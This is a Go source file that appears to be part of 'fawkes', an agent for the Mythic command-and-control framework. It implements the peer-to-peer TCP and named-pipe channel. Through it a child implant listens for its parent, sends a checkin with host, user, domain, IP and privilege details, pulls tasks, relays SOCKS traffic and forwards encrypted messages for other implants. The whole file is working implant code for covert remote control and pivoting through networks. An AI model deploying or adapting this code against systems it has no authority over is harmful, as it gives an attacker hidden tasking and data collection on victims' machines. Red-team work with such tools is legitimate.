package tcp

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"time"

	"fawkes/pkg/structs"
)

// Checkin performs the initial checkin via TCP or named pipe.
// For a P2P child agent, this sends the checkin message to the parent agent who forwards it to Mythic.
func (t *TCPProfile) Checkin(agent *structs.Agent) error {
	// P2P child agents wait for an incoming connection from the parent (egress) agent.
	// The parent connects to us via the link command, so we listen.
	if t.BindAddress == "" && t.PipeName == "" {
		return fmt.Errorf("P2P profile requires a bind address or pipe name")
	}

	var err error
	if t.PipeName != "" {
		// Named pipe listener (Windows only — stubs return error on other platforms)
		t.listener, err = createNamedPipeListener(t.PipeName)
		if err != nil {
			return fmt.Errorf("failed to create named pipe listener: %w", err)
		}
		log.Printf("listening pipe %s", t.PipeName)
	} else {
		// TCP listener
		t.listener, err = net.Listen("tcp", t.BindAddress)
		if err != nil {
			return fmt.Errorf("failed to listen on %s: %w", t.BindAddress, err)
		}
		log.Printf("listening %s", t.BindAddress)
	}

	// Wait for the parent agent to connect (with timeout)
	// Only TCP listeners support SetDeadline; named pipe listeners handle timeouts via Accept context
	if tcpL, ok := t.listener.(*net.TCPListener); ok {
		tcpL.SetDeadline(time.Now().Add(5 * time.Minute))
	}
	conn, err := t.listener.Accept()
	if err != nil {
		t.listener.Close()
		return fmt.Errorf("failed to accept parent connection: %w", err)
	}
	t.parentMu.Lock()
	t.parentConn = conn
	t.parentMu.Unlock()
	log.Printf("peer connected from %s", conn.RemoteAddr())

	// Send checkin message to parent
	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin: %w", err)
	}

	// Encrypt if key provided
	if t.getEncryptionKey() != "" {
		body, err = t.encryptMessage(body)
		if err != nil {
			return fmt.Errorf("encryption failed: %w", err)
		}
	}

	// Frame: UUID + encrypted body
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Cache checkin data for potential relink
	t.cachedCheckinData = []byte(encodedData)

	// Send via TCP (length-prefixed)
	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
		return fmt.Errorf("failed to send checkin: %w", err)
	}

	// Read checkin response from parent
	respData, err := t.recvTCP(conn)
	if err != nil {
		return fmt.Errorf("failed to receive checkin response: %w", err)
	}

	// Decrypt response
	var decryptedResponse []byte
	if t.getEncryptionKey() != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err != nil {
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}
		decryptedResponse, err = t.decryptResponse(decodedData)
		if err != nil {
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respData
	}

	// Parse response for callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			t.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			t.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		t.UpdateCallbackUUID(agent.PayloadUUID)
	}

	// Continue accepting connections in the background for additional child links
	go t.acceptChildConnections()

	return nil
}

// GetTasking retrieves tasks from the parent agent via TCP.
func (t *TCPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	t.parentMu.Lock()
	conn := t.parentConn
	t.parentMu.Unlock()

	if conn == nil {
		// Parent is dead — trigger relink and wait for a new parent
		t.triggerRelink()
		return nil, nil, fmt.Errorf("no parent connection, waiting for relink")
	}

	// Collect any delegate messages from children to forward upstream
	var delegates []structs.DelegateMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			goto done
		}
	}
done:

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1,
		Socks:       outboundSocks,
		Delegates:   delegates,
		PayloadUUID: t.getActiveUUID(agent),
		PayloadType: "fawkes",
		C2Profile:   "tcp",
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking: %w", err)
	}

	if t.getEncryptionKey() != "" {
		body, err = t.encryptMessage(body)
		if err != nil {
			return nil, nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	activeUUID := t.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
		t.handleDeadParent()
		return nil, nil, fmt.Errorf("failed to send tasking request: %w", err)
	}

	respData, err := t.recvTCP(conn)
	if err != nil {
		t.handleDeadParent()
		return nil, nil, fmt.Errorf("failed to receive tasking response: %w", err)
	}

	var decryptedData []byte
	if t.getEncryptionKey() != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}
		decryptedData, err = t.decryptResponse(decodedData)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
	} else {
		decryptedData = respData
	}

	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		return []structs.Task{}, nil, nil
	}

	// Extract tasks
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.NewTask(
						getString(taskMap, "id"),
						getString(taskMap, "command"),
						getString(taskMap, "parameters"),
					)
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS messages
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			_ = json.Unmarshal(socksRaw, &inboundSocks)
		}
	}

	// Extract delegate messages for children and route them
	if delegateList, exists := taskResponse["delegates"]; exists {
		if delegateRaw, err := json.Marshal(delegateList); err == nil {
			var incomingDelegates []structs.DelegateMessage
			if err := json.Unmarshal(delegateRaw, &incomingDelegates); err == nil {
				t.routeDelegatesToChildren(incomingDelegates)
			}
		}
	}

	return tasks, inboundSocks, nil
}

// PostResponse sends a response back through the parent TCP connection.
func (t *TCPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	t.parentMu.Lock()
	conn := t.parentConn
	t.parentMu.Unlock()

	if conn == nil {
		return nil, fmt.Errorf("no parent connection, waiting for relink")
	}

	// Collect delegate messages and edge notifications
	var delegates []structs.DelegateMessage
	for {
		select {
		case d := <-t.InboundDelegates:
			delegates = append(delegates, d)
		default:
			goto doneDelegates
		}
	}
doneDelegates:

	var edges []structs.P2PConnectionMessage
	for {
		select {
		case e := <-t.EdgeMessages:
			edges = append(edges, e)
		default:
			goto doneEdges
		}
	}
doneEdges:

	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
		Delegates: delegates,
		Edges:     edges,
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response: %w", err)
	}

	if t.getEncryptionKey() != "" {
		body, err = t.encryptMessage(body)
		if err != nil {
			return nil, fmt.Errorf("encryption failed: %w", err)
		}
	}

	activeUUID := t.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
		t.handleDeadParent()
		return nil, fmt.Errorf("failed to send response: %w", err)
	}

	respData, err := t.recvTCP(conn)
	if err != nil {
		t.handleDeadParent()
		return nil, fmt.Errorf("failed to receive PostResponse reply: %w", err)
	}

	var decryptedData []byte
	if t.getEncryptionKey() != "" {
		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
		if err != nil {
			return nil, fmt.Errorf("failed to decode PostResponse reply: %w", err)
		}
		decryptedData, err = t.decryptResponse(decodedData)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt PostResponse reply: %w", err)
		}
	} else {
		decryptedData = respData
	}

	// Route any delegate responses to children
	var postRespData map[string]interface{}
	if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
		if delegateList, exists := postRespData["delegates"]; exists {
			if delegateRaw, err := json.Marshal(delegateList); err == nil {
				var incomingDelegates []structs.DelegateMessage
				if err := json.Unmarshal(delegateRaw, &incomingDelegates); err == nil {
					t.routeDelegatesToChildren(incomingDelegates)
				}
			}
		}
	}

	return decryptedData, nil
}
